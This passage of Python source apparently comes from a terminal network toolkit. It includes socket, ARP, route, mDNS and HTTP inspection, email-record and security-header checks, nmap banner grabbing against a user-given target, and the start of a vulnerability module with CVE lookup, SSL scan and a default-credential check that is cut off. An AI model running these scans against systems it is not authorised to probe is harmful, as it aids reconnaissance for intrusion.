                connections.sort(key=lambda x: x[2] + x[3], reverse=True)

                log.write(f"{'Local':<25} {'Remote':<25} {'Recv':<12} {'Sent'}")
                log.write("-" * 75)

                def fmt_bytes(b):
                    if b > 1_000_000:
                        return f"{b/1_000_000:.1f} MB"
                    elif b > 1_000:
                        return f"{b/1_000:.1f} KB"
                    return f"{b} B"

                for local, remote, recv, sent in connections[:15]:
                    total = recv + sent
                    if total > 1_000_000:
                        color = "green"
                    elif total > 10_000:
                        color = "yellow"
                    else:
                        color = "gray"
                    log.write(f"[{color}]{local:<25} {remote:<25} {fmt_bytes(recv):<12} {fmt_bytes(sent)}[/{color}]")

            status.update("[green]Top talkers loaded[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def get_socket_stats(self) -> None:
        """Get socket statistics."""
        log = self.query_one("#monitor-results", RichLog)
        status = self.query_one("#monitor-status", Static)

        log.clear()
        status.update("[cyan]Getting socket statistics...[/cyan]")
        log.write("[bold cyan]Socket Statistics[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "ss", "-s",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if 'TCP:' in line or 'UDP:' in line:
                        log.write(f"[bold cyan]{line}[/bold cyan]")
                    elif 'estab' in line.lower():
                        log.write(f"[green]{line}[/green]")
                    elif 'closed' in line.lower() or 'time-wait' in line.lower():
                        log.write(f"[yellow]{line}[/yellow]")
                    else:
                        log.write(line)

            # Also get netstat-style summary
            log.write("\n[bold cyan]Protocol Statistics[/bold cyan]")
            proc = await asyncio.create_subprocess_exec(
                "cat", "/proc/net/snmp",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                lines = stdout.decode().strip().split('\n')
                i = 0
                while i < len(lines) - 1:
                    if lines[i].startswith('Tcp:') or lines[i].startswith('Udp:'):
                        headers = lines[i].split()
                        values = lines[i + 1].split()
                        protocol = headers[0].rstrip(':')
                        log.write(f"\n[cyan]{protocol}:[/cyan]")

                        for j in range(1, min(len(headers), len(values))):
                            header = headers[j]
                            value = values[j]
                            if header in ['InSegs', 'OutSegs', 'InDatagrams', 'OutDatagrams']:
                                log.write(f"  {header}: [green]{int(value):,}[/green]")
                            elif header in ['InErrs', 'OutErrs', 'InCsumErrors']:
                                if int(value) > 0:
                                    log.write(f"  {header}: [red]{int(value):,}[/red]")
                    i += 2

            status.update("[green]Socket stats loaded[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")


class ToolsModule(Container):
    """Utility tools: Subnet calc, WoL, mDNS browser, hosts editor."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._mdns_services = []

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="CIDR/MAC/host", id="tools-input"),
                Button("Subnet", id="btn-subnet", variant="primary"),
                Button("WoL", id="btn-wol"),
                Button("mDNS", id="btn-mdns"),
                Button("ARP", id="btn-arp"),
                Button("Routes", id="btn-routes"),
                Button("Hosts", id="btn-hosts"),
                Button("Ifaces", id="btn-ifaces"),
                Static("", id="tools-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="tools-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-subnet")
    def do_subnet(self) -> None:
        cidr = self.query_one("#tools-input", Input).value.strip()
        if not cidr:
            cidr = get_network_cidr()
            self.query_one("#tools-input", Input).value = cidr
        self.calc_subnet(cidr)

    @on(Button.Pressed, "#btn-wol")
    def do_wol(self) -> None:
        mac = self.query_one("#tools-input", Input).value.strip()
        if not mac:
            self.query_one("#tools-status", Static).update("[red]Enter a MAC address[/red]")
            return
        self.send_wol(mac)

    @on(Button.Pressed, "#btn-mdns")
    def do_mdns(self) -> None:
        self.browse_mdns()

    @on(Button.Pressed, "#btn-hosts")
    def do_hosts(self) -> None:
        self.view_hosts()

    @on(Button.Pressed, "#btn-arp")
    def do_arp(self) -> None:
        self.view_arp_table()

    @on(Button.Pressed, "#btn-routes")
    def do_routes(self) -> None:
        self.view_routes()

    @on(Button.Pressed, "#btn-dns-flush")
    def do_dns_flush(self) -> None:
        self.flush_dns()

    @on(Button.Pressed, "#btn-ifaces")
    def do_ifaces(self) -> None:
        self.view_interfaces()

    def calc_subnet(self, cidr: str) -> None:
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        result = calculate_subnet(cidr)

        if "error" in result:
            log.write(f"[red]Error: {result['error']}[/red]")
            status.update("[red]Invalid CIDR[/red]")
            return

        log.write(f"[bold cyan]Subnet Calculator: {cidr}[/bold cyan]\n")
        log.write(f"[green]Network Address:[/green]  {result['network']}")
        log.write(f"[green]Netmask:[/green]          {result['netmask']}")
        log.write(f"[green]Wildcard:[/green]         {result['wildcard']}")
        log.write(f"[green]Broadcast:[/green]        {result['broadcast']}")
        log.write(f"[green]First Host:[/green]       {result['first_host']}")
        log.write(f"[green]Last Host:[/green]        {result['last_host']}")
        log.write(f"[green]Usable Hosts:[/green]     {result['num_hosts']}")
        log.write(f"[green]Prefix Length:[/green]    /{result['prefix_len']}")

        status.update("[green]Calculation complete[/green]")

    @work(exclusive=True)
    async def send_wol(self, mac: str) -> None:
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        status.update(f"[cyan]Sending Wake-on-LAN to {mac}...[/cyan]")

        try:
            packet = create_wol_packet(mac)

            # Send to broadcast
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.sendto(packet, ("255.255.255.255", 9))
            sock.close()

            log.write(f"[bold cyan]Wake-on-LAN[/bold cyan]\n")
            log.write(f"[green]Magic packet sent to {mac}[/green]")
            log.write(f"[gray]Broadcast: 255.255.255.255:9[/gray]")
            log.write(f"[gray]Packet size: {len(packet)} bytes[/gray]")

            vendor = lookup_mac_vendor(mac)
            log.write(f"[gray]Vendor: {vendor}[/gray]")

            status.update("[green]WoL packet sent[/green]")

            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                play_beep(1000, 100)

        except ValueError as e:
            log.write(f"[red]Invalid MAC address: {e}[/red]")
            status.update("[red]Invalid MAC[/red]")
        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]WoL failed[/red]")

    @work(exclusive=True)
    async def browse_mdns(self) -> None:
        """Browse for mDNS/Bonjour services."""
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        status.update("[cyan]Browsing mDNS services (5 seconds)...[/cyan]")

        if not HAS_ZEROCONF:
            log.write("[red]zeroconf library not installed[/red]")
            log.write("[gray]Install with: pip3 install zeroconf[/gray]")
            status.update("[red]Missing dependency[/red]")
            return

        try:
            log.write("[bold cyan]mDNS/Bonjour Services[/bold cyan]\n")

            services_found = []

            class MyListener(ServiceListener):
                def add_service(self, zc, type_, name):
                    services_found.append((type_, name))

                def remove_service(self, zc, type_, name):
                    pass

                def update_service(self, zc, type_, name):
                    pass

            zeroconf = Zeroconf()
            listener = MyListener()

            # Common service types
            service_types = [
                "_http._tcp.local.",
                "_https._tcp.local.",
                "_ssh._tcp.local.",
                "_sftp-ssh._tcp.local.",
                "_smb._tcp.local.",
                "_afpovertcp._tcp.local.",
                "_printer._tcp.local.",
                "_ipp._tcp.local.",
                "_airplay._tcp.local.",
                "_raop._tcp.local.",
                "_googlecast._tcp.local.",
                "_spotify-connect._tcp.local.",
                "_homekit._tcp.local.",
            ]

            browsers = []
            for stype in service_types:
                try:
                    browser = ServiceBrowser(zeroconf, stype, listener)
                    browsers.append(browser)
                except Exception:
                    pass

            # Wait for discovery
            await asyncio.sleep(5)

            # Close browsers
            for browser in browsers:
                browser.cancel()
            zeroconf.close()

            if services_found:
                # Group by type
                by_type = {}
                for stype, name in services_found:
                    stype_short = stype.replace("._tcp.local.", "").replace("_", "")
                    if stype_short not in by_type:
                        by_type[stype_short] = []
                    by_type[stype_short].append(name.replace(f".{stype}", ""))

                for stype, names in sorted(by_type.items()):
                    log.write(f"[cyan]{stype}:[/cyan]")
                    for name in names:
                        log.write(f"  [green]{name}[/green]")
            else:
                log.write("[yellow]No services found[/yellow]")

            status.update(f"[green]Found {len(services_found)} services[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]mDNS browse failed[/red]")

    @work(exclusive=True)
    async def view_hosts(self) -> None:
        """View /etc/hosts file."""
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        status.update("[cyan]Reading hosts file...[/cyan]")

        try:
            log.write("[bold cyan]/etc/hosts[/bold cyan]\n")

            with open("/etc/hosts", "r") as f:
                for line in f:
                    line = line.rstrip()
                    if line.startswith("#"):
                        log.write(f"[gray]{line}[/gray]")
                    elif line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[0]
                            hosts = " ".join(parts[1:])
                            log.write(f"[green]{ip:<20}[/green] {hosts}")
                        else:
                            log.write(line)

            log.write("\n[gray]Edit with: sudo nano /etc/hosts[/gray]")
            status.update("[green]Hosts file loaded[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed to read hosts[/red]")

    @work(exclusive=True)
    async def view_arp_table(self) -> None:
        """View the ARP table."""
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        status.update("[cyan]Reading ARP table...[/cyan]")
        log.write("[bold cyan]ARP Table[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "ip", "neigh", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                log.write(f"{'IP Address':<18} {'MAC Address':<20} {'State':<12} {'Vendor'}")
                log.write("-" * 70)

                for line in stdout.decode().strip().split('\n'):
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 4:
                            ip = parts[0]
                            # Find MAC address (after 'lladdr')
                            mac = "N/A"
                            state = "INCOMPLETE"
                            for i, p in enumerate(parts):
                                if p == "lladdr" and i + 1 < len(parts):
                                    mac = parts[i + 1]
                                if p in ["REACHABLE", "STALE", "DELAY", "PROBE", "FAILED", "PERMANENT"]:
                                    state = p

                            vendor = lookup_mac_vendor(mac) if mac != "N/A" else ""

                            if state == "REACHABLE":
                                log.write(f"[green]{ip:<18} {mac:<20} {state:<12} {vendor}[/green]")
                            elif state == "STALE":
                                log.write(f"[yellow]{ip:<18} {mac:<20} {state:<12} {vendor}[/yellow]")
                            else:
                                log.write(f"[gray]{ip:<18} {mac:<20} {state:<12} {vendor}[/gray]")

            status.update("[green]ARP table loaded[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed to read ARP table[/red]")

    @work(exclusive=True)
    async def view_routes(self) -> None:
        """View the routing table."""
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        status.update("[cyan]Reading routing table...[/cyan]")
        log.write("[bold cyan]Routing Table[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "ip", "route", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if line.strip():
                        if line.startswith("default"):
                            log.write(f"[green]{line}[/green]")
                        elif "linkdown" in line.lower():
                            log.write(f"[red]{line}[/red]")
                        else:
                            log.write(f"[cyan]{line}[/cyan]")

            # Also show IPv6 routes
            log.write("\n[bold cyan]IPv6 Routes[/bold cyan]")
            proc = await asyncio.create_subprocess_exec(
                "ip", "-6", "route", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if line.strip():
                        log.write(f"[yellow]{line}[/yellow]")

            status.update("[green]Routing table loaded[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed to read routes[/red]")

    @work(exclusive=True)
    async def flush_dns(self) -> None:
        """Flush DNS cache."""
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        status.update("[cyan]Flushing DNS cache...[/cyan]")
        log.write("[bold cyan]DNS Cache Flush[/bold cyan]\n")

        try:
            # Try systemd-resolve first (most common on modern systems)
            proc = await asyncio.create_subprocess_exec(
                "sudo", "systemd-resolve", "--flush-caches",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await proc.communicate()

            if proc.returncode == 0:
                log.write("[green]✓ systemd-resolve cache flushed[/green]")
            else:
                # Try resolvectl (newer systems)
                proc = await asyncio.create_subprocess_exec(
                    "sudo", "resolvectl", "flush-caches",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                _, stderr = await proc.communicate()

                if proc.returncode == 0:
                    log.write("[green]✓ resolvectl cache flushed[/green]")
                else:
                    log.write("[yellow]⚠ No systemd-resolved found[/yellow]")

            # Also try nscd if available
            proc = await asyncio.create_subprocess_exec(
                "sudo", "nscd", "-i", "hosts",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await proc.communicate()

            if proc.returncode == 0:
                log.write("[green]✓ nscd hosts cache invalidated[/green]")

            log.write("\n[gray]DNS cache has been flushed[/gray]")
            status.update("[green]DNS cache flushed[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]DNS flush failed[/red]")

    @work(exclusive=True)
    async def view_interfaces(self) -> None:
        """View network interfaces."""
        log = self.query_one("#tools-results", RichLog)
        status = self.query_one("#tools-status", Static)

        log.clear()
        status.update("[cyan]Getting interface info...[/cyan]")
        log.write("[bold cyan]Network Interfaces[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "ip", "-c", "addr", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                current_iface = ""
                for line in stdout.decode().strip().split('\n'):
                    if line and not line.startswith(' '):
                        # Interface line
                        match = re.match(r'\d+:\s+(\S+):', line)
                        if match:
                            current_iface = match.group(1)
                            state = "UP" if "UP" in line else "DOWN"
                            if state == "UP":
                                log.write(f"\n[bold green]{current_iface}[/bold green] [{state}]")
                            else:
                                log.write(f"\n[bold red]{current_iface}[/bold red] [{state}]")
                    elif "inet " in line:
                        # IPv4 address
                        match = re.search(r'inet (\S+)', line)
                        if match:
                            log.write(f"  [cyan]IPv4:[/cyan] {match.group(1)}")
                    elif "inet6" in line and "scope global" in line:
                        # Global IPv6 address
                        match = re.search(r'inet6 (\S+)', line)
                        if match:
                            log.write(f"  [cyan]IPv6:[/cyan] {match.group(1)}")
                    elif "link/ether" in line:
                        # MAC address
                        match = re.search(r'link/ether (\S+)', line)
                        if match:
                            mac = match.group(1)
                            vendor = lookup_mac_vendor(mac)
                            log.write(f"  [cyan]MAC:[/cyan]  {mac} ({vendor})")

            status.update("[green]Interface info loaded[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed to get interfaces[/red]")


class HTTPModule(Container):
    """HTTP inspection module."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="URL", id="http-url"),
                Select([
                    ("GET", "GET"),
                    ("HEAD", "HEAD"),
                    ("POST", "POST"),
                ], id="http-method", value="GET"),
                Button("Send", id="btn-http-send", variant="primary"),
                Button("Headers", id="btn-http-headers"),
                Button("Redirects", id="btn-http-redirects"),
                Button("Clear", id="btn-http-clear", variant="error"),
                Static("", id="http-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="http-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-http-send")
    def do_send(self) -> None:
        url = self.query_one("#http-url", Input).value.strip()
        if not url:
            self.query_one("#http-status", Static).update("[red]Enter a URL[/red]")
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self.query_one("#http-url", Input).value = url
        method = self.query_one("#http-method", Select).value
        self.send_request(url, method)

    @on(Button.Pressed, "#btn-http-headers")
    def do_headers(self) -> None:
        url = self.query_one("#http-url", Input).value.strip()
        if not url:
            self.query_one("#http-status", Static).update("[red]Enter a URL[/red]")
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        self.get_headers(url)

    @on(Button.Pressed, "#btn-http-redirects")
    def do_redirects(self) -> None:
        url = self.query_one("#http-url", Input).value.strip()
        if not url:
            self.query_one("#http-status", Static).update("[red]Enter a URL[/red]")
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        self.trace_redirects(url)

    @on(Button.Pressed, "#btn-http-clear")
    def clear_results(self) -> None:
        self.query_one("#http-results", RichLog).clear()
        self.query_one("#http-status", Static).update("")

    @work(exclusive=True)
    async def send_request(self, url: str, method: str) -> None:
        log = self.query_one("#http-results", RichLog)
        status = self.query_one("#http-status", Static)

        log.clear()
        status.update(f"[cyan]Sending {method} request...[/cyan]")

        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-o", "/dev/null", "-w",
                "%{http_code}|%{time_total}|%{size_download}|%{speed_download}|%{remote_ip}",
                "-X", method, "-L", "--max-time", "30", url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                parts = stdout.decode().strip().split("|")
                if len(parts) >= 5:
                    code, time_s, size, speed, ip = parts[:5]
                    code_int = int(code) if code.isdigit() else 0

                    log.write(f"[bold cyan]HTTP Response[/bold cyan]\n")
                    log.write(f"[green]URL:[/green] {url}")
                    log.write(f"[green]Method:[/green] {method}")
                    log.write(f"[green]Remote IP:[/green] {ip}")

                    # Color code status
                    if 200 <= code_int < 300:
                        log.write(f"[green]Status Code:[/green] [bold green]{code}[/bold green]")
                    elif 300 <= code_int < 400:
                        log.write(f"[green]Status Code:[/green] [bold yellow]{code}[/bold yellow]")
                    elif 400 <= code_int < 500:
                        log.write(f"[green]Status Code:[/green] [bold red]{code}[/bold red]")
                    else:
                        log.write(f"[green]Status Code:[/green] [bold magenta]{code}[/bold magenta]")

                    log.write(f"[green]Response Time:[/green] {float(time_s)*1000:.0f} ms")
                    size_kb = int(size) / 1024
                    log.write(f"[green]Content Size:[/green] {size_kb:.1f} KB")
                    speed_kb = float(speed) / 1024
                    log.write(f"[green]Download Speed:[/green] {speed_kb:.1f} KB/s")

            status.update("[green]Request complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Request failed[/red]")

    @work(exclusive=True)
    async def get_headers(self, url: str) -> None:
        log = self.query_one("#http-results", RichLog)
        status = self.query_one("#http-status", Static)

        log.clear()
        status.update("[cyan]Fetching headers...[/cyan]")

        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-I", "-L", "--max-time", "30", url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                log.write(f"[bold cyan]HTTP Headers: {url}[/bold cyan]\n")
                for line in stdout.decode().strip().split('\n'):
                    if line.startswith("HTTP/"):
                        log.write(f"[bold magenta]{line}[/bold magenta]")
                    elif ":" in line:
                        key, _, value = line.partition(":")
                        key_lower = key.lower()
                        # Highlight security headers
                        if any(h in key_lower for h in ['security', 'x-frame', 'x-xss', 'x-content', 'strict-transport', 'content-security']):
                            log.write(f"[green]{key}:[/green][cyan]{value}[/cyan]")
                        elif any(h in key_lower for h in ['server', 'x-powered']):
                            log.write(f"[yellow]{key}:[/yellow]{value}")
                        else:
                            log.write(f"[green]{key}:[/green]{value}")
                    elif line.strip():
                        log.write(line)

            status.update("[green]Headers retrieved[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def trace_redirects(self, url: str) -> None:
        log = self.query_one("#http-results", RichLog)
        status = self.query_one("#http-status", Static)

        log.clear()
        status.update("[cyan]Tracing redirects...[/cyan]")

        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-L", "-w", "%{url_effective}", "-o", "/dev/null",
                "--max-redirs", "10", "--max-time", "30",
                "-D", "-", url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                log.write(f"[bold cyan]Redirect Chain: {url}[/bold cyan]\n")
                output = stdout.decode()
                lines = output.split('\n')

                hop = 0
                for line in lines:
                    if line.startswith("HTTP/"):
                        log.write(f"\n[bold yellow]Hop {hop}:[/bold yellow] {line.strip()}")
                        hop += 1
                    elif line.lower().startswith("location:"):
                        log.write(f"  [cyan]→ {line.split(':', 1)[1].strip()}[/cyan]")

                # Final URL is the last part
                final = lines[-1] if lines else url
                if not final.startswith("HTTP"):
                    log.write(f"\n[bold green]Final URL:[/bold green] {final}")

            status.update("[green]Redirect trace complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")


class SecurityModule(Container):
    """Security checking module."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="Target", id="sec-target"),
                Input(placeholder="Port", id="sec-port", value="22"),
                Button("HTTP Sec", id="btn-sec-http", variant="primary"),
                Button("Email Sec", id="btn-sec-email"),
                Button("Banner", id="btn-sec-banner"),
                Button("Clear", id="btn-sec-clear", variant="error"),
                Static("", id="sec-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="sec-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-sec-http")
    def do_http_security(self) -> None:
        target = self.query_one("#sec-target", Input).value.strip()
        if not target:
            self.query_one("#sec-status", Static).update("[red]Enter a target[/red]")
            return
        self.check_http_security(target)

    @on(Button.Pressed, "#btn-sec-email")
    def do_email_security(self) -> None:
        target = self.query_one("#sec-target", Input).value.strip()
        if not target:
            self.query_one("#sec-status", Static).update("[red]Enter a domain[/red]")
            return
        self.check_email_security(target)

    @on(Button.Pressed, "#btn-sec-banner")
    def do_banner(self) -> None:
        target = self.query_one("#sec-target", Input).value.strip()
        port = self.query_one("#sec-port", Input).value.strip()
        if not target:
            self.query_one("#sec-status", Static).update("[red]Enter a target[/red]")
            return
        self.grab_banner(target, port or "22")

    @on(Button.Pressed, "#btn-sec-clear")
    def clear_results(self) -> None:
        self.query_one("#sec-results", RichLog).clear()
        self.query_one("#sec-status", Static).update("")

    @work(exclusive=True)
    async def check_http_security(self, target: str) -> None:
        log = self.query_one("#sec-results", RichLog)
        status = self.query_one("#sec-status", Static)

        log.clear()
        if not target.startswith(("http://", "https://")):
            target = "https://" + target

        status.update("[cyan]Checking HTTP security headers...[/cyan]")
        log.write(f"[bold cyan]HTTP Security Check: {target}[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-I", "-L", "--max-time", "15", target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            headers_found = {}
            if stdout:
                for line in stdout.decode().split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers_found[key.lower().strip()] = value.strip()

            # Security headers checklist
            security_headers = {
                'strict-transport-security': ('HSTS', 'Enforces HTTPS'),
                'x-frame-options': ('X-Frame-Options', 'Clickjacking protection'),
                'x-content-type-options': ('X-Content-Type-Options', 'MIME sniffing protection'),
                'x-xss-protection': ('X-XSS-Protection', 'XSS filter'),
                'content-security-policy': ('CSP', 'Content Security Policy'),
                'referrer-policy': ('Referrer-Policy', 'Referrer control'),
                'permissions-policy': ('Permissions-Policy', 'Feature control'),
            }

            log.write("[bold cyan]Security Headers:[/bold cyan]")
            for header, (name, desc) in security_headers.items():
                if header in headers_found:
                    log.write(f"[green]✓ {name}:[/green] {headers_found[header][:50]}")
                else:
                    log.write(f"[red]✗ {name}:[/red] Missing ({desc})")

            # Check for information disclosure
            log.write("\n[bold cyan]Information Disclosure:[/bold cyan]")
            if 'server' in headers_found:
                log.write(f"[yellow]⚠ Server:[/yellow] {headers_found['server']}")
            if 'x-powered-by' in headers_found:
                log.write(f"[yellow]⚠ X-Powered-By:[/yellow] {headers_found['x-powered-by']}")

            status.update("[green]Security check complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Check failed[/red]")

    @work(exclusive=True)
    async def check_email_security(self, domain: str) -> None:
        log = self.query_one("#sec-results", RichLog)
        status = self.query_one("#sec-status", Static)

        log.clear()
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]

        status.update("[cyan]Checking email security records...[/cyan]")
        log.write(f"[bold cyan]Email Security Check: {domain}[/bold cyan]\n")

        try:
            # SPF
            log.write("[bold cyan]SPF Record:[/bold cyan]")
            proc = await asyncio.create_subprocess_exec(
                "dig", "+short", "TXT", domain,
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            spf_found = False
            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if 'spf' in line.lower():
                        log.write(f"[green]✓ {line}[/green]")
                        spf_found = True
            if not spf_found:
                log.write("[red]✗ No SPF record found[/red]")

            # DMARC
            log.write("\n[bold cyan]DMARC Record:[/bold cyan]")
            proc = await asyncio.create_subprocess_exec(
                "dig", "+short", "TXT", f"_dmarc.{domain}",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            if stdout and stdout.decode().strip():
                log.write(f"[green]✓ {stdout.decode().strip()}[/green]")
            else:
                log.write("[red]✗ No DMARC record found[/red]")

            # DKIM (common selectors)
            log.write("\n[bold cyan]DKIM Records:[/bold cyan]")
            dkim_selectors = ['default', 'google', 'selector1', 'selector2', 'k1', 'mail']
            dkim_found = False
            for selector in dkim_selectors:
                proc = await asyncio.create_subprocess_exec(
                    "dig", "+short", "TXT", f"{selector}._domainkey.{domain}",
                    stdout=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                if stdout and stdout.decode().strip() and 'DKIM' not in stdout.decode():
                    if 'v=DKIM' in stdout.decode() or 'p=' in stdout.decode():
                        log.write(f"[green]✓ {selector}._domainkey: Found[/green]")
                        dkim_found = True
                        break
            if not dkim_found:
                log.write("[yellow]⚠ No common DKIM selectors found[/yellow]")

            # MX records
            log.write("\n[bold cyan]MX Records:[/bold cyan]")
            proc = await asyncio.create_subprocess_exec(
                "dig", "+short", "MX", domain,
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if line.strip():
                        log.write(f"[green]{line}[/green]")
            else:
                log.write("[red]✗ No MX records found[/red]")

            status.update("[green]Email security check complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Check failed[/red]")

    @work(exclusive=True)
    async def grab_banner(self, target: str, port: str) -> None:
        log = self.query_one("#sec-results", RichLog)
        status = self.query_one("#sec-status", Static)

        log.clear()
        status.update(f"[cyan]Grabbing banner from {target}:{port}...[/cyan]")
        log.write(f"[bold cyan]Banner Grab: {target}:{port}[/bold cyan]\n")

        try:
            # Use nmap for banner grabbing
            proc = await asyncio.create_subprocess_exec(
                "nmap", "-sV", "--script=banner", "-p", port, target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                for line in stdout.decode().split('\n'):
                    if 'open' in line.lower():
                        log.write(f"[green]{line}[/green]")
                    elif 'banner' in line.lower() or 'service' in line.lower():
                        log.write(f"[cyan]{line}[/cyan]")
                    elif line.strip() and not line.startswith('Starting') and not line.startswith('Nmap done'):
                        log.write(line)

            status.update("[green]Banner grab complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Banner grab failed[/red]")


class VulnModule(Container):
    """Vulnerability scanning module - CVE lookup, SSL checks, default creds."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="Target IP/Host", id="vuln-target"),
                Input(placeholder="Port (opt)", id="vuln-port", value=""),
                Input(placeholder="Service/Version", id="vuln-service"),
                Button("CVE Lookup", id="btn-vuln-cve", variant="primary"),
                Button("SSL Scan", id="btn-vuln-ssl"),
                Button("Defaults", id="btn-vuln-creds"),
                Button("Quick Scan", id="btn-vuln-quick"),
                Button("Clear", id="btn-vuln-clear", variant="error"),
                Static("", id="vuln-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="vuln-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-vuln-cve")
    def do_cve_lookup(self) -> None:
        service = self.query_one("#vuln-service", Input).value.strip()
        if not service:
            self.query_one("#vuln-status", Static).update("[red]Enter service/version[/red]")
            return
        self.run_cve_lookup(service)

    @on(Button.Pressed, "#btn-vuln-ssl")
    def do_ssl_scan(self) -> None:
        target = self.query_one("#vuln-target", Input).value.strip()
        if not target:
            self.query_one("#vuln-status", Static).update("[red]Enter a target[/red]")
            return
        port = self.query_one("#vuln-port", Input).value.strip() or "443"
        self.run_ssl_scan(target, port)

    @on(Button.Pressed, "#btn-vuln-creds")
    def do_cred_check(self) -> None:
        target = self.query_one("#vuln-target", Input).value.strip()
        if not target:
